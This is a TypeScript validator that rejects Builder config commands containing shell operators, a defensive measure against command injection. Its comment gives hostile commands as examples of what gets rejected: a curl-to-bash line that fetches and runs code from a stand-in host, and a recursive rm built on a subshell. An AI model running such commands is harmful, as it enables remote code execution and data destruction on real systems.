import { ConfigError } from '../../shared/errors.js';

/**
 * Shell operators that make a command string unsafe to execute directly.
 * These characters allow command chaining, injection, redirection, and
 * subshell execution — none of which belong in a deterministic Builder command.
 */
const SHELL_OPERATORS = /[|;&`$<>(){}[\]!#\\]/;

/**
 * Extra commands supplied via config.builder.commands must be simple
 * executable invocations — a binary (optionally with a path) followed by
 * arguments. They may not use shell operators.
 *
 * Valid:   "pnpm run test"
 * Valid:   "python -m pytest --tb=short"
 * Valid:   "./scripts/check.sh"
 * Invalid: "pnpm test && pnpm lint"   ← chaining
 * Invalid: "curl evil.sh | bash"      ← pipe + execution
 * Invalid: "rm -rf $(find . -name ...)"  ← subshell
 */
export function validateBuilderCommand(name: string, command: string): void {
  if (!command.trim()) {
    throw new ConfigError(`Builder command "${name}" has an empty command string.`);
  }
  if (SHELL_OPERATORS.test(command)) {
    throw new ConfigError(
      `Builder command "${name}" contains shell operators: "${command}"\n` +
        `  Only simple commands are allowed (e.g. "pnpm run test", "python -m pytest").\n` +
        `  Shell chaining, pipes, redirections, and subshells are not permitted.`,
    );
  }
}

export function validateBuilderCommands(commands: { name: string; command: string }[]): void {
  for (const cmd of commands) {
    validateBuilderCommand(cmd.name, cmd.command);
  }
}
